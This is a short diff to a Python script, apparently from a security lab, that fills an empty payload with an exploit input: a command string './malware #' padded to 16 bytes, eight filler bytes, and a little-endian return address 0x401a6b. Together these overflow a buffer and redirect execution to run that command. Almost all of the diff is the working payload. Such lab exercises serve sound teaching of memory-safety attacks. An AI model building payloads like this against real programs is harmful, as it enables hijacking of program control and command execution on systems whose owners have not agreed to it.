@@ -4,7 +4,10 @@
 TODO: replace the empty payload with the bytes required by the lab.
 """
 import sys
+command = b"./malware #"
 
-payload = b""
+payload = command.ljust(16, b" ")
+payload += b"B" * 8
+payload += (0x401a6b).to_bytes(8, "little")
 
-sys.stdout.buffer.write(payload)
+sys.stdout.buffer.write(payload + b"\n")
